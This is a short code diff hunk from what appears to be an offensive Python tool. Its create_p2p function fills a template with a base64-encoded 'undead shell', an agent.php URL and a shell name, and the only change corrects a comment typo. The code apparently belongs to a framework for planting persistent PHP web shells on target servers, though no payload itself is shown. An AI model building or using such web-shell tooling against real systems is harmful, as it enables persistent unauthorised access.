@@ -332,7 +332,7 @@ def create_p2p(target,target_port,cmd):
     shell_name,shell,shell_base64 = generate_shell(target,target_port,cmd,2)
     template = template.replace('{{undead_shell}}',shell_base64)
 
-    #confi
+    #config
     template = template.replace('{{agent_url}}',shell_path + 'agent.php')
     template = template.replace('{{shell_name}}',shell_name)
     agent_absolute_path = shell_absolute_path + 'agent.php'
